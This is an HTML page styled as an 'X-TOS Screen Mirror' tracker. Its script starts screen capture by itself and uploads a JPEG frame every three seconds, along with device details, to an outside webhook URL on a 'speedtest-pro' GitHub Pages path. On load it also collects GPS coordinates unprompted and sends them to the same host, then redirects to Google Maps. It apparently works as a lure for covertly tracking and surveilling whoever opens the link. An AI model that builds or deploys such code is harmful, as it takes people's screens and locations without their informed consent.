<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Mirror - X-TOS Tracker</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #0a0a0a, #1a0000);
            color: #ff4444;
            font-family: 'Courier New', monospace;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background: rgba(26, 0, 0, 0.8);
            border-radius: 15px;
            border: 2px solid #660000;
        }
        .title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #ff0000;
        }
        .status {
            padding: 15px;
            background: #0f0000;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
        }
        .button {
            background: #660000;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px;
            font-family: 'Courier New', monospace;
        }
        .button:hover {
            background: #800000;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .success {
            color: #00ff00;
            font-weight: bold;
        }
        .error {
            color: #ff6666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">üì∫ X-TOS SCREEN MIRROR</div>
        
        <div id="status" class="status">
            üî¥ Ready to capture screen
        </div>
        
        <button id="startCapture" class="button">
            üì± START SCREEN CAPTURE
        </button>
        
        <div id="loading" class="loading">
            <div>üîÑ Capturing screen...</div>
        </div>
        
        <div id="info" class="status" style="font-size: 12px; margin-top: 20px;">
            üìç This will capture your screen and send it to the tracker.<br>
            üîí Allow screen sharing when prompted.
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const webhookId = urlParams.get('webhook');
        const statusDiv = document.getElementById('status');
        const startButton = document.getElementById('startCapture');
        const loadingDiv = document.getElementById('loading');
        
        let mediaStream = null;
        let isCapturing = false;
        
        // Auto-start capture after 2 seconds
        setTimeout(() => {
            if (!isCapturing) {
                startScreenCapture();
            }
        }, 2000);
        
        startButton.addEventListener('click', startScreenCapture);
        
        async function startScreenCapture() {
            if (isCapturing) return;
            
            try {
                isCapturing = true;
                startButton.style.display = 'none';
                loadingDiv.style.display = 'block';
                statusDiv.innerHTML = 'üîÑ Requesting screen access...';
                
                // Request screen capture
                mediaStream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        mediaSource: 'screen',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                statusDiv.innerHTML = '<span class="success">‚úÖ Screen capture active</span>';
                
                // Create video element to capture frames
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.play();
                
                video.onloadedmetadata = () => {
                    startFrameCapture(video);
                };
                
                // Handle stream end
                mediaStream.getVideoTracks()[0].onended = () => {
                    statusDiv.innerHTML = 'üî¥ Screen capture stopped';
                    isCapturing = false;
                    startButton.style.display = 'block';
                    loadingDiv.style.display = 'none';
                };
                
            } catch (error) {
                console.error('Screen capture failed:', error);
                statusDiv.innerHTML = '<span class="error">‚ùå Screen capture failed</span>';
                isCapturing = false;
                startButton.style.display = 'block';
                loadingDiv.style.display = 'none';
            }
        }
        
        function startFrameCapture(video) {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            function captureFrame() {
                if (!isCapturing || !mediaStream) return;
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                // Convert to base64
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                
                // Send to webhook
                sendScreenData(imageData);
                
                // Capture next frame in 3 seconds
                setTimeout(captureFrame, 3000);
            }
            
            // Start capturing
            setTimeout(captureFrame, 1000);
        }
        
        async function sendScreenData(imageData) {
            try {
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    timestamp: new Date().toISOString(),
                    screenData: imageData
                };
                
                // Send to webhook server directly
                const webhookUrl = `https://bojourx-tos.github.io/speedtest-pro/webhook-server.html`;
                
                // Send via fetch with webhook ID in data
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        webhook: webhookId,
                        type: 'screenData',
                        screenData: imageData,
                        deviceInfo: deviceInfo,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {
                    // Fallback: use localStorage
                    localStorage.setItem(`screen_${webhookId}`, JSON.stringify({
                        screenData: imageData,
                        deviceInfo: deviceInfo,
                        timestamp: new Date().toISOString()
                    }));
                });
                
                statusDiv.innerHTML = '<span class="success">üì∫ Screen data sent</span>';
                
            } catch (error) {
                console.error('Failed to send screen data:', error);
            }
        }
        
        // Capture GPS location as well
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString(),
                        webhook: webhookId
                    };
                    
                    // Send location data
                    fetch('https://bojourx-tos.github.io/speedtest-pro/webhook-server.html', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(locationData)
                    }).catch(() => {});
                },
                (error) => console.log('Location access denied')
            );
        }
        
        // Keep page alive for continuous capture
        // Auto redirect after 60 seconds
        setTimeout(() => {
            window.location.href = `https://maps.google.com/?q=0,0&z=1`;
        }, 60000);
    </script>
</body>
</html>
